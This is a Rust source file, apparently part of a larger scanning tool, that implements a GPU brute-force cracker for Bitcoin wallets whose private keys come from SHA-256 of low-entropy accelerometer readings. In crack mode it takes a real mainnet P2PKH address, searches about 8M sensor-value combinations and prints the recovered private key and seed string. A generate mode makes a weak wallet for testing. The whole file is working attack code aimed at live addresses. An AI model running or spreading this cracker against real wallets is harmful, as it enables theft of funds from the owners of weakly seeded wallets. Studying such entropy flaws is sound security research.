#[cfg(feature = "gpu")]
use crate::scans::gpu_solver::GpuSolver;
use anyhow::Result;
#[cfg(feature = "gpu")]
use bitcoin::key::Secp256k1;
#[cfg(feature = "gpu")]
use bitcoin::secp256k1::SecretKey;
#[cfg(feature = "gpu")]
use bitcoin::{Address, Network};
#[cfg(feature = "gpu")]
use hex;
#[cfg(feature = "gpu")]
use rand::Rng;
#[cfg(feature = "gpu")]
use sha2::{Digest, Sha256};
#[cfg(feature = "gpu")]
use std::str::FromStr;
#[cfg(feature = "gpu")]
use tracing::{info, warn};

#[cfg(not(feature = "gpu"))]
pub fn run(_target: Option<String>) -> Result<()> {
    anyhow::bail!("This scanner requires GPU acceleration. Please recompile with --features gpu");
}

/// Mobile Sensor Entropy Vulnerability Scanner & Cracker
///
/// Mode 1: Generate (No target)
/// Simulates a wallet created with low-entropy sensor data.
/// Prints the address and the secret sensor values.
///
/// Mode 2: Crack (--target <addr>)
/// Uses GPU to brute-force the sensor values (x,y,z) that generated the target address.
#[cfg(feature = "gpu")]
pub fn run(target: Option<String>) -> Result<()> {
    info!("Mobile Sensor Entropy Vulnerability (GPU-Accelerated)");

    // Initialize GPU with MobileSensor profile (reduced constant memory usage)
    let solver = match GpuSolver::new_with_profile(
        crate::scans::gpu_solver::KernelProfile::MobileSensor,
    ) {
        Ok(s) => s,
        Err(e) => {
            warn!("[GPU] Failed to initialize GPU solver: {}", e);
            warn!("[GPU] This scanner requires GPU acceleration with mobile_sensor_hash and mobile_sensor_crack kernels");
            warn!("[GPU] Note: CPU-only fallback is not currently implemented for this scanner");
            anyhow::bail!(
                "GPU initialization failed. This scanner requires a GPU with OpenCL support."
            );
        }
    };
    info!("[GPU] Solver initialized");

    if let Some(target_addr) = target {
        // CRACK MODE
        info!("Mode: CRACK");
        info!("Target Address: {}", target_addr);

        let address = Address::from_str(&target_addr)?.require_network(Network::Bitcoin)?;
        let script = address.script_pubkey();
        if !script.is_p2pkh() {
            warn!("Warning: Not a P2PKH address, skipping.");
            return Ok(());
        }
        // P2PKH script: OP_DUP OP_HASH160 <20-byte-hash> OP_EQUALVERIFY OP_CHECKSIG
        // Hash is at offset 3 (1 byte OP_DUP, 1 byte OP_HASH160, 1 byte len 0x14)
        let hash_bytes: [u8; 20] = script.as_bytes()[3..23].try_into()?;

        info!("Target Hash160: {}", hex::encode(hash_bytes));
        info!("Launching GPU Brute-Force (Search Space: ~8M combinations)...");

        let start_time = std::time::Instant::now();
        let results = solver.compute_mobile_crack(&hash_bytes)?;

        if !results.is_empty() {
            let gid = results[0];
            // Decode GID to x, y, z
            let range = 201;
            let z_idx = gid % range as u64;
            let y_idx = (gid / range as u64) % range as u64;
            let x_idx = gid / (range as u64 * range as u64);

            let acc_x = x_idx as i32 - 100;
            let acc_y = y_idx as i32 - 100;
            let acc_z = z_idx as i32 + 900;

            warn!("\n[GPU] 🔓 CRACKED SUCCESSFUL!");
            warn!("Secret Sensor Values found:");
            warn!("  acc_x: {}", acc_x);
            warn!("  acc_y: {}", acc_y);
            warn!("  acc_z: {}", acc_z);

            // Reconstruct Key to verify
            let seed_input = format!("{},{},{}", acc_x, acc_y, acc_z);
            let seed_hash = Sha256::digest(seed_input.as_bytes());
            let priv_key_bytes = seed_hash.as_slice();

            warn!("  Private Key: {}", hex::encode(priv_key_bytes));
            warn!("  Seed String: \"{}\"", seed_input);
        } else {
            info!("\n[GPU] Failed to crack. Target might not be in search space.");
        }

        info!("Time elapsed: {:.2}s", start_time.elapsed().as_secs_f64());
    } else {
        // GENERATE MODE
        info!("Mode: GENERATE (Weak Wallet)");

        // Pick random sensor values in the search space
        let mut rng = rand::thread_rng();
        let acc_x = rng.gen_range(-20..20);
        let acc_y = rng.gen_range(-20..20);
        let acc_z = rng.gen_range(970..990);

        let seed_input = format!("{},{},{}", acc_x, acc_y, acc_z);
        let seed_hash = Sha256::digest(seed_input.as_bytes());
        let priv_key_bytes = seed_hash.as_slice();

        let secp = Secp256k1::new();
        let secret_key = SecretKey::from_slice(&priv_key_bytes)?;
        let pubkey = secret_key.public_key(&secp);
        let address = Address::p2pkh(bitcoin::PublicKey::new(pubkey), Network::Bitcoin);

        info!("\nGenerated Weak Wallet:");
        info!("  Address: {}", address);
        info!(
            "  (Secret) Sensor Values: x={}, y={}, z={}",
            acc_x, acc_y, acc_z
        );
        info!("  (Secret) Private Key:   {}", hex::encode(priv_key_bytes));

        info!("\nTo test cracking, run:");
        info!(
            "  cargo run --release -- mobile-sensor --target {}",
            address
        );
    }

    Ok(())
}
